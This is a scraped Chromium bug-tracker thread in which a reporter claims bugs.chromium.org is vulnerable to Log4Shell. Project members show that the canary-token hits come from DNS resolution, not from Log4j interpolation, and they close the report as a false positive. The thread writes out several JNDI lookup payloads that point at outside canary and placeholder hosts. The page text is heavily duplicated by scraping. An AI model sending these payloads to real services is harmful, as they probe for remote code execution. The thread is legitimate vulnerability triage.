      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;

            width: 100%;
            padding: 0;

            width: 100%;

            border: 0;
          }
        }
        @media (max-width: 840px) {

            width: 100%;

        }

          width: 100%;

          padding-top: 0.5em;
        }

          box-sizing: border-box;

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    
        <select aria-label="Description history menu" hidden="">

      <option value="0" selected="">

      <div class="select-container">
        <select aria-label="Description history menu" hidden="">

        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    <!---->
        </select>
      </div>
      Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<span class="line"><!---->I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<!----></span><br><br>I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<span class="line"><!---->I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<!----></span><br><br>The Log4j shell is successfully Getting Triggered. Please Go through the POC.<span class="line"><!---->The Log4j shell is successfully Getting Triggered. Please Go through the POC.<!----></span><br><br>Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<span class="line"><!---->Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<!----></span><br><br>Repro Steps<span class="line"><!---->Repro Steps<!----></span><br>1. Go to <span class="line"><!---->1. Go to <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> and Generate Log4j Shell Token and then click manage this token<span class="line"><!----> and Generate Log4j Shell Token and then click manage this token<!----></span><br>2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<span class="line"><!---->2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<!----></span><br>3. Go to browser and open <span class="line"><!---->3. Go to browser and open <!----></span>https://bugs.chromium.org/p/chromium/issues/listand<a class="undefined" target="_blank" href="https://bugs.chromium.org/p/chromium/issues/listand"><!---->https://bugs.chromium.org/p/chromium/issues/listand<!----></a> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<span class="line"><!----> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<!----></span><br>4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<span class="line"><!---->4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<!----></span><br><br>You will get notification on mail for Log4j Shell Triggered and also on <span class="line"><!---->You will get notification on mail for Log4j Shell Triggered and also on <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> as shown in POC.<span class="line"><!----> as shown in POC.<!----></span><br><br>It is showing Chrome Web Application is vulnerable to Log4j<span class="line"><!---->It is showing Chrome Web Application is vulnerable to Log4j<!----></span><mr-comment-content></mr-comment-content>

      </div><br>
    
        
      
        This site is written in Python and therefore is not subject to CVE-2021-44228. What is likely happening is that the domain is being resolved (but no code execution is happening), so this is simply a false positive. +pawalls@ for confirmation.<span class="line"><!---->This site is written in Python and therefore is not subject to CVE-2021-44228. What is likely happening is that the domain is being resolved (but no code execution is happening), so this is simply a false positive. +pawalls@ for confirmation.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>

        Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<span class="line"><!---->Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<!----></span><br><br>If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<span class="line"><!---->If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<!----></span><br><br>* `${jndi:rmi://${lower:interpolated123<span class="line"><!---->* `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br>* `${jndi:ldap://${lower:interpolated123<span class="line"><!---->* `${jndi:ldap://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br><br>These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <span class="line"><!---->These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <!----></span>`<span class="line"><!---->`<!----></span>foo.bar.com/baz`<a class="undefined" target="_blank" href="https://foo.bar.com/baz`"><!---->foo.bar.com/baz`<!----></a>,<span class="line"><!---->,<!----></span> but systems with Log4J would try to resolve <span class="line"><!----> but systems with Log4J would try to resolve <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com"><!---->interpolated123foo.bar.com<!----></a>` and send the request to <span class="line"><!---->` and send the request to <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com/baz`<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com/baz`"><!---->interpolated123foo.bar.com/baz`<!----></a>.<span class="line"><!---->.<!----></span><br><br>In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<span class="line"><!---->In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<!----></span><br><br>If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<span class="line"><!---->If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<!----></span><mr-comment-content></mr-comment-content>

        by

        Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>We can see that we are using the Log4j Payloads with ${jndi:ldap://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/a} or this * `${jndi:rmi://${lower:interpolated123<span class="line"><!---->We can see that we are using the Log4j Payloads with ${jndi:ldap://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/a} or this * `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<!----></a> format payload is getting triggered which means application is not applying protection for Log4j payloads on comment and it is exposing internal IP's.<span class="line"><!----> format payload is getting triggered which means application is not applying protection for Log4j payloads on comment and it is exposing internal IP's.<!----></span><br><br>Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<span class="line"><!---->Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<!----></span><br><br>I can confirm from other companies that those who have started protection against Log4j shell are not allowing to put these above payloads as well on the system.<span class="line"><!---->I can confirm from other companies that those who have started protection against Log4j shell are not allowing to put these above payloads as well on the system.<!----></span><br><br>First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<span class="line"><!---->First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<!----></span><br><br>While putting the comment there is an communication happening with the server and that is why payload is getting triggered and providing the IP's.<span class="line"><!---->While putting the comment there is an communication happening with the server and that is why payload is getting triggered and providing the IP's.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

        > First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<span class="line"><!---->&gt; First of all Payload is considering JNDI and LDAP words and still they are getting triggered.<!----></span><br><br>I'm not sure this is the case. I think it's more likely that Monorail is ignoring everything that doesn't look like a URL. From my understanding to prove that this is actually going through a log4jshell is if the `log4_shell_computer_name` was present with values that could only have been supplied by Log4J interpolation as described in <span class="line"><!----> in a bug (a token of my own making).         Hi aishwary.tripathi.295@, thanks for this report.<span class="line"><!---->Hi aishwary.tripathi.295@, thanks for this report.<!----></span><br><br>There's nothing to fix here.<span class="line"><!---->There's nothing to fix here.<!----></span><br><br>What's happening is that aspects of the Chromium infrastructure are spotting the DNS names within your payloads and are resolving them for various reasons. As you say, this exposes internal IPs but that's not a concern.<span class="line"><!---->What's happening is that aspects of the Chromium infrastructure are spotting the DNS names within your payloads and are resolving them for various reasons. As you say, this exposes internal IPs but that's not a concern.<!----></span><br><br>There is no log4j interpolation happening here. You've proved that yourself. With the payload:<span class="line"><!---->There is no log4j interpolation happening here. You've proved that yourself. With the payload:<!----></span><br>  `${jndi:rmi://${lower:interpolated123<span class="line"><!---->  `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com/baz}`<!----></a> <span class="line"><!----> <!----></span><br><br>you saw a hit on the canarytoken<span class="line"><!---->you saw a hit on the canarytoken<!----></span><br> <span class="line"><!----> <!----></span> <span class="line"><!----> <!----></span>hwr90n7ver9ok5jbl0btktyim.canarytokens.com<a class="undefined" target="_blank" href="https://hwr90n7ver9ok5jbl0btktyim.canarytokens.com"><!---->hwr90n7ver9ok5jbl0btktyim.canarytokens.com<!----></a><br><br>If log4j interpolation was happening, our infrastructure would instead have requested<span class="line"><!---->If log4j interpolation was happening, our infrastructure would instead have requested<!----></span><br> <span class="line"><!----> <!----></span> <span class="line"><!----> <!----></span>interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com<a class="undefined" target="_blank" href="https://interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com"><!---->interpolated123hwr90n7ver9ok5jbl0btktyim.canarytokens.com<!----></a><br><br>You state:<span class="line"><!---->You state:<!----></span><br>> Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<span class="line"><!---->&gt; Hostname, yes that is getting ignored but i am sure attacker will find a way to exploit that as it is not stopping the overall format of Log4j Payload which should not be the case.<!----></span><br><br>That's not correct. The log4j bug is, of course, only exploitable if log4j is interpreting that payload. That log4j interpretation code would be the code which fetches remote code to arrange a shell, or in the simple example above, interpolates 'interpolated123'. Those things aren't happening and can't happen because log4j is not interpreting this payload, and no other code is interpreting it according to log4j rules, so there's no way an attacker can exploit this.<span class="line"><!---->That's not correct. The log4j bug is, of course, only exploitable if log4j is interpreting that payload. That log4j interpretation code would be the code which fetches remote code to arrange a shell, or in the simple example above, interpolates 'interpolated123'. Those things aren't happening and can't happen because log4j is not interpreting this payload, and no other code is interpreting it according to log4j rules, so there's no way an attacker can exploit this.<!----></span><br><br>Thanks again for the report and please don't hestitate to report other vulnerabilities in Chromium or its infrastructure, we appreciate it.<span class="line"><!---->Thanks again for the report and please don't hestitate to report other vulnerabilities in Chromium or its infrastructure, we appreciate it.<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      
        
          
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>

          Blocked on issues<span>Blocked on issues</span>
          
            close<i class="material-icons">close</i>
          <button aria-label="close">
            <i class="material-icons">close</i>
          </button>

          <span>Blocked on issues</span>

          </button>

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    <!---->
        </select>
      <div class="select-container">
        <select aria-label="Description history menu" hidden="">
          <!---->
      <option value="0" selected="">
        Description #1 by aishw...@gmail.com (Dec 14, 2021)
      </option>
    <!---->
        </select>
      </div>
      Hi Team,<span class="line"><!---->Hi Team,<!----></span><br><br>I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<span class="line"><!---->I have successfully found that Chrome Web Application is vulnerable to Log4j Shell. The Log4j Shell is getting triggered on Chrome's Bug reporting site.<!----></span><br><br>I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<span class="line"><!---->I have inserted the payload and payload instructs the vulnerable application to connect to an attacker-controlled LDAP server via the JNDI API<!----></span><br><br>The Log4j shell is successfully Getting Triggered. Please Go through the POC.<span class="line"><!---->The Log4j shell is successfully Getting Triggered. Please Go through the POC.<!----></span><br><br>Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<span class="line"><!---->Logging untrusted or user-controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data provided in logged errors such as exception traces, authentication failures, and other unexpected vectors of user-controlled input.<!----></span><br><br>Repro Steps<span class="line"><!---->Repro Steps<!----></span><br>1. Go to <span class="line"><!---->1. Go to <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> and Generate Log4j Shell Token and then click manage this token<span class="line"><!----> and Generate Log4j Shell Token and then click manage this token<!----></span><br>2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<span class="line"><!---->2. To test the Log4j in Application put the token in command like this - ${jndi:ldap://x${hostName}.L4J.rh2z92aan2x5rgo3mxvbbz262.canarytokens.com/a} in which hostname will your controlled server<!----></span><br>3. Go to browser and open <span class="line"><!---->3. Go to browser and open <!----></span>https://bugs.chromium.org/p/chromium/issues/listand<a class="undefined" target="_blank" href="https://bugs.chromium.org/p/chromium/issues/listand"><!---->https://bugs.chromium.org/p/chromium/issues/listand<!----></a> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<span class="line"><!----> go to any issue number and in comment section put the payload. In comment put this payload to test the application is vulnerable to Log4j or not.<!----></span><br>4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<span class="line"><!---->4. The Shell is getting triggered on both occasion when you are creating the issue or when you are commenting on someone else's issue.<!----></span><br><br>You will get notification on mail for Log4j Shell Triggered and also on <span class="line"><!---->You will get notification on mail for Log4j Shell Triggered and also on <!----></span>https://canarytokens.org/<a class="undefined" target="_blank" href="https://canarytokens.org/"><!---->https://canarytokens.org/<!----></a> as shown in POC.<span class="line"><!----> as shown in POC.<!----></span><br><br>It is showing Chrome Web Application is vulnerable to Log4j<span class="line"><!---->It is showing Chrome Web Application is vulnerable to Log4j<!----></span><mr-comment-content></mr-comment-content>

        This site is written in Python and therefore is not subject to CVE-2021-44228.           Comment 5<a class="comment-link" href="?id=1279979#c5">Comment 5<!----></a>

          
        by
        
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>

      dominickn@chromium.org<span id="user-text" hidden=""><!---->dominickn@chromium.org<!----></span>
      <div id="availability-text" class="availability-notice" title="undefined" hidden=""><!----><!----></div>

        <div>
          <a class="comment-link" href="?id=1279979#c5">Comment 5<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Dec 14, 2021, 6:25 PM EST"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      <div role="heading" class="comment-header" aria-level="2">
        <div>
          <a class="comment-link" href="?id=1279979#c5">Comment 5<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Tue, Dec 14, 2021, 6:25 PM EST"></chops-timestamp>
        
          <span class="role-label">Project Member</span>
      
        </div>
        
      </div>
    
      
        
        
      
        Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<span class="line"><!---->Our systems often scan for hostnames and URLs in various user inputs (e.g. chat messages, emails), resolve them via DNS, and try to fetch the URLs, for example to determine if the payload is malicious, or whether the message itself should be classified as spam. We think this is what happened here.<!----></span><br><br>If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<span class="line"><!---->If you think we made a mistake here, and you have sufficient evidence that a Log4Shell vulnerability is actually triggered by the way you describe, you can try the following: Modify the payload, such that the literal payload does not contain the full hostname, but that the hostname is created by the Log4J interpolation. For example:<!----></span><br><br>* `${jndi:rmi://${lower:interpolated123<span class="line"><!---->* `${jndi:rmi://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br>* `${jndi:ldap://${lower:interpolated123<span class="line"><!---->* `${jndi:ldap://${lower:interpolated123<!----></span>}<span class="line"><!---->}<!----></span>foo.bar.com/baz}`<a class="undefined" target="_blank" href="https://foo.bar.com/baz}`"><!---->foo.bar.com/baz}`<!----></a><br><br>These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <span class="line"><!---->These payloads are constructed in such a way, that the systems that don't understand Log4J interpolation syntax, and have nothing to do with Log4Shell vulnerability, would see only <!----></span>`<span class="line"><!---->`<!----></span>foo.bar.com/baz`<a class="undefined" target="_blank" href="https://foo.bar.com/baz`"><!---->foo.bar.com/baz`<!----></a>,<span class="line"><!---->,<!----></span> but systems with Log4J would try to resolve <span class="line"><!----> but systems with Log4J would try to resolve <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com"><!---->interpolated123foo.bar.com<!----></a>` and send the request to <span class="line"><!---->` and send the request to <!----></span>`<span class="line"><!---->`<!----></span>interpolated123foo.bar.com/baz`<a class="undefined" target="_blank" href="https://interpolated123foo.bar.com/baz`"><!---->interpolated123foo.bar.com/baz`<!----></a>.<span class="line"><!---->.<!----></span><br><br>In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<span class="line"><!---->In other words, such payload allows you to scan our services with much bigger confidence that you're catching actual Log4Shell, and not random ways that our services use to connect to external services for e.g. anti-spam purposes.<!----></span><br><br>If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<span class="line"><!---->If by using the above method you can confirm what looks like actual Log4Shell bug, please just update this report with your finding.<!----></span><mr-comment-content></mr-comment-content>

